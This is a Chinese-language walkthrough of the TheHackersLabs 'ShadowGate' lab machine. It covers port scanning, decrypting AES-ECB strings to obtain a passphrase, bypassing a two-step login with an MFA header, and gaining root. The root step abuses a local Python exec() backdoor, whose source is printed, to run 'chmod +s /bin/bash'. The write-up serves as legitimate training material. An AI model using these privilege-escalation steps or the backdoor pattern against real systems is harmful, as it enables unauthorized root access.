{"pageProps":{"postData":{"id":"TheHackersLabsShadowGate","contentHtml":"<h1>ShadowGate</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/97\">https://labs.thehackerslabs.com/machine/97</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  ShadowGate nmap -sT -min-rate 10000 -p- 192.168.56.105\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:20 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.105\nHost is up (0.00050s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n8080/tcp  open  http-proxy\n56789/tcp open  unknown\nMAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 16.41 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  ShadowGate nmap -sT -A -p 22,8080,56789 192.168.56.105\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:21 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.105\nHost is up (0.00047s latency).\n\nPORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 84:05:fe:ed:47:16:ab:28:70:0f:44:6e:f6:8d:0c:6f (ECDSA)\n|_  256 99:a9:88:76:ee:c8:ed:ce:73:57:2a:22:da:9f:7b:7e (ED25519)\n8080/tcp  open  http       Werkzeug httpd 3.1.3 (Python 3.12.3)\n|_http-title: 403 Forbidden\n|_http-server-header: Werkzeug/3.1.3 Python/3.12.3\n56789/tcp open  tcpwrapped\nMAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.47 ms 192.168.56.105\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 26.07 seconds\n</code></pre>\n<h3>枚举</h3>\n<p><code>8080</code> 端口</p>\n<p>提示错误的方法，但是你找到路径了</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/Snipaste_2025-08-05_21-30-52.png\" alt=\"Snipaste_2025-08-05_21-30-52.png\"></p>\n<p>改为 <code>POST</code> 方法后提示</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image1.png\" alt=\"image.png\"></p>\n<p>没有任何信息，看一下其他端口</p>\n<p>奇怪的 <code>56789</code> 端口，<code>nc</code> 试一下</p>\n<pre><code class=\"hljs language-bash\">➜  ShadowGate nc 192.168.56.105 56789                 \nShadow Gate v1.0 :: Not all doors are locked. Some <span class=\"hljs-built_in\">wait</span> <span class=\"hljs-keyword\">for</span> n0cturne. Listen closely—patterns hide <span class=\"hljs-keyword\">in</span> the noise. Sequence always matters.\nListening... but no response.\n</code></pre>\n<blockquote>\n<p>暗影之门 v1.0 :: 并非所有门都锁着。有些门在等待夜幕降临。仔细聆听——噪音中隐藏着规律。顺序总是很重要。\n聆听……但没有回应。</p>\n</blockquote>\n<p>看着像是要向里边按顺序输入一下东西</p>\n<h2>56789</h2>\n<p>当我们输入 <code>n0cturne</code> 时，会出现好几串 <code>base64</code> 加密后的字符</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image2.png\" alt=\"image.png\"></p>\n<p>并且重新输入生成的还是不一样的</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image3.png\" alt=\"image.png\"></p>\n<p>根据特征，解密后得到 16字节 = 128位。这是现代分组密码（如 <code>AES-128</code>）最常见的块大小（Block Size）</p>\n<pre><code class=\"hljs language-bash\">// 第一次生成\nYzRmN2QzNQ==\nMwaB7TbchXxNQQwID9JXIg==\n7+ptCEtXTcCFo8dVwYrIEw==\nYAgEH6bP+PPY4VyD80z7sg==\na+T5dxugIDfFykgQi71Eag==\nfGMHS36e74T+cALZURlj8g==\nez4fog9UnAeemGETp6K2Aw==\nXZSJq2YIk3v/GM9R/NPa9w==\nsh6KfrTKDXndFadgySlIhA==\n\n// 第二次生成\nYzRmN2QzNQ==\n5/moJpOc9OpfYOHR6jl+bA==\nGWxuKkuzPn0t4aTSO0livQ==\nE2QIRlxnY+gWfTlVUcm4LA==\nYu9ChnO4fJxbMPPGbN04ug==\nNdNO8rDcGcLah47kqmnKBA==\ngFpBAQKKx1QDMNw60GkiwA==\n4eL9754ZX/qQYUk4s6Q9SA==\nMxte5TYR9OIZuzOmQDWAYg==\n</code></pre>\n<p>第一行解码为：<code>YzRmN2QzNQ==</code> ><code>c4f7d35</code></p>\n<p>这里因为我对密码学不熟，查阅了一下 <code>WP</code></p>\n<p>第一串编码应该是密钥</p>\n<pre><code class=\"hljs language-bash\">(more) ➜  ShadowGate <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"c4f7d35\"</span> | <span class=\"hljs-built_in\">sha256sum</span>\n7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75  -\n</code></pre>\n<p>然后在 <code>cyberchef</code> 进行解密，因为我们不知道 <code>IV</code> 以及加密模式，我们都可以进行测试一下，最后可以使用 <code>ECB/NoPadding</code> 进行解密</p>\n<p>解密第一次的密文</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image4.png\" alt=\"image.png\"></p>\n<p>解密第二次的密文</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image5.png\" alt=\"image.png\"></p>\n<p>可以发现每一段密文的第一个字符都是一样的，能拿到 <code>v4u1tgx9</code></p>\n<h2>8080</h2>\n<p>拿到 <code>v4u1tgx9</code> 之后，我们应该可以对 <code>8080</code> 进行测试了</p>\n<p>输入 <code>username</code></p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image6.png\" alt=\"image.png\"></p>\n<blockquote>\n<p>令牌已派出。你只需要……侧身看。</p>\n</blockquote>\n<p>提示缺少 <code>Token</code> ，并且还看到相应保中带有 <code>MFA</code>（双重认证），是基于时间生成的 <code>TOTP</code> 一次性口令，无法直接爆破</p>\n<p>对目录进行爆破，尝试寻找更多接口</p>\n<pre><code class=\"hljs language-bash\">➜  ShadowGate ffuf -u <span class=\"hljs-string\">'http://192.168.56.105:8080/FUZZ'</span> -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -<span class=\"hljs-built_in\">fc</span> 404,403 -X POST -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span>\n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : POST\n :: URL              : http://192.168.56.105:8080/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 404,403\n________________________________________________\n\nlogin                   [Status: 200, Size: 48, Words: 8, Lines: 1, Duration: 72ms]\nverify                  [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 85ms]\n</span></code></pre>\n<p>找到 <code>verify</code> 的端点，进行测试，所以 <code>login</code>是第一层认证，<code>verify</code> 是第二层认证</p>\n<p>将第一层的响应中的 <code>X-Shadow-MFA: 286346</code> 放到 <code>verify</code>中</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image7.png\" alt=\"image.png\"></p>\n<p>添加后提示：” 承认。主动服务。“</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image8.png\" alt=\"image.png\"></p>\n<p>回到 <code>56789</code>端口，原本的行为会被改变</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image9.png\" alt=\"image.png\"></p>\n<p>得到一组凭据 <code>mars:sshpassword123</code></p>\n<p>该用户能读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">mars@TheHackersLabs-Shadowgate:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nacf9xxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>权限提升</h2>\n<p>查看正在监听端口</p>\n<p>存在一个本地打开 <code>4444</code> 端口</p>\n<pre><code class=\"hljs language-bash\">mars@TheHackersLabs-Shadowgate:~$ ss -tulpn\nNetid          State           Recv-Q          Send-Q                             Local Address:Port                      Peer Address:Port          Process                                    \nudp            UNCONN          0               0                                     127.0.0.54:53                             0.0.0.0:*                                                        \nudp            UNCONN          0               0                                  127.0.0.53%lo:53                             0.0.0.0:*                                                        \nudp            UNCONN          0               0                          192.168.56.105%enp0s3:68                             0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                      127.0.0.1:4444                           0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                        0.0.0.0:2222                           0.0.0.0:*              <span class=\"hljs-built_in\">users</span>:((\"socat\",pid=<span class=\"hljs-number\">25904</span>,fd=<span class=\"hljs-number\">5</span>))          \ntcp            LISTEN          0               4096                               127.0.0.53%lo:53                             0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                        0.0.0.0:56789                          0.0.0.0:*                                                        \ntcp            LISTEN          0               4096                                  127.0.0.54:53                             0.0.0.0:*                                                        \ntcp            LISTEN          0               128                                      0.0.0.0:8080                           0.0.0.0:*                                                        \ntcp            LISTEN          0               4096                                           *:22                                   *:* \n</code></pre>\n<p>使用 <code>socat</code> 转发出来</p>\n<pre><code class=\"hljs language-bash\">mars@TheHackersLabs-Shadowgate:~$ ./socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:4444 &#x26;\n</code></pre>\n<p>进行交互</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image10.png\" alt=\"image.png\"></p>\n<p>测试了一下有点懵</p>\n<p>在 <code>/opt</code> 中能找到源码</p>\n<pre><code class=\"hljs language-bash\">mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ <span class=\"hljs-built_in\">cat</span> shadow-client.py\n<span class=\"hljs-comment\">#!/usr/bin/env python3</span>\nimport socket\nimport threading\nimport io\nimport contextlib\n\ndef handle_client(client_socket):\n    client_socket.send(b<span class=\"hljs-string\">\"Welcome to Shadow Client Helper\\n\"</span>)\n    client_socket.send(b<span class=\"hljs-string\">\"This is an unrestricted environment. Good luck, hacker.\\n\"</span>)\n    <span class=\"hljs-keyword\">while</span> True:\n        client_socket.send(b<span class=\"hljs-string\">\">>> \"</span>)\n        code = client_socket.recv(1024).decode().strip()\n        try:\n            output = io.StringIO()\n            with contextlib.redirect_stdout(output):\n                <span class=\"hljs-built_in\">exec</span>(code, globals())\n            result = output.getvalue()\n            <span class=\"hljs-keyword\">if</span> result.strip():\n                client_socket.send(result.encode())\n        except Exception as e:\n            client_socket.send(f<span class=\"hljs-string\">\"Error: {e}\\n\"</span>.encode())\n\ndef main():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind((\"<span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>\", <span class=\"hljs-number\">4444</span>))\n    server.listen(5)\n    <span class=\"hljs-keyword\">while</span> True:\n        client, addr = server.accept()\n        client_handler = threading.Thread(target=handle_client, args=(client,))\n        client_handler.start()\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    main()\n</code></pre>\n<p>简单来说，它创建了一个服务器，任何连接到这个服务器的客户端都可以执行任意的 Python 代码，并获取执行结果。 这本质上是一个远程代码执行（RCE, Remote Code Execution）的后门程序。</p>\n<p>这就简单了，输入</p>\n<pre><code class=\"hljs language-bash\">>>> import os;\n>>> os.system(<span class=\"hljs-string\">\"chmod +s /bin/bash\"</span>)\n</code></pre>\n<p>回到靶机上查看</p>\n<p><img src=\"/post-images/TheHackersLabsShadowGate/image11.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ /bin/bash -p\nbash-5.2# <span class=\"hljs-built_in\">cd</span> /root\nbash-5.2# <span class=\"hljs-built_in\">cat</span> root.txt\n437axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","updated":"2025-08-06","tags":["TheHackersLabs","Linux","MFA","ffuf","Python"],"categories":"靶机","comments":true,"description":"ShadowGate https://labs.thehackerslabs.com/machine/97 Recon PortScan 枚举 8080 端口 提示错误的方法，但是你找到路径了 改为 POST 方法后提示 没有任何信息，看一下其他端口 奇怪的 56789 端口，nc 试一下 暗影之门..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true}